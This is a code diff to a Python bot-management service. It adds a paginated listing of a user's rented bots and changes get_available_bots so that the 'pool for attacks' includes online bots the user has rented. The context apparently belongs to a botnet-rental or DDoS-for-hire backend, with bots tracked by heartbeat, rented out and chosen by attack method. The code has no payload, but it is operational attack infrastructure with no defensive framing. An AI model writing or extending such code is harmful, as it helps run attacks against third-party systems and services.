@@ -67,9 +67,29 @@ class BotService:
                 await s.commit()
 
     @staticmethod
-    async def get_available_bots(count: int, methods: List[str]) -> List[Bot]:
+    async def list_user_bots(user_id: UUID, page: int = 1, per_page: int = 50):
+        """Bots rented by this user."""
         async with async_session() as s:
-            result = await s.execute(select(Bot).where(Bot.status == "online", Bot.is_rented == False).limit(count))
+            bq = select(Bot).where(Bot.rented_by_user_id == user_id)
+            total = (await s.execute(select(func.count()).select_from(bq.subquery()))).scalar() or 0
+            items = (await s.execute(
+                bq.order_by(Bot.last_heartbeat_at.desc().nulls_last())
+                .offset((page - 1) * per_page).limit(per_page)
+            )).scalars().all()
+            return list(items), total
+
+    @staticmethod
+    async def get_available_bots(count: int, methods: List[str], user_id: Optional[UUID] = None) -> List[Bot]:
+        """Pool for attacks: online bots free OR rented by this user."""
+        async with async_session() as s:
+            if user_id:
+                q = select(Bot).where(
+                    Bot.status == "online",
+                    or_(Bot.is_rented == False, Bot.rented_by_user_id == user_id),
+                ).limit(count)
+            else:
+                q = select(Bot).where(Bot.status == "online", Bot.is_rented == False).limit(count)
+            result = await s.execute(q)
             return list(result.scalars().all())
 
     @staticmethod
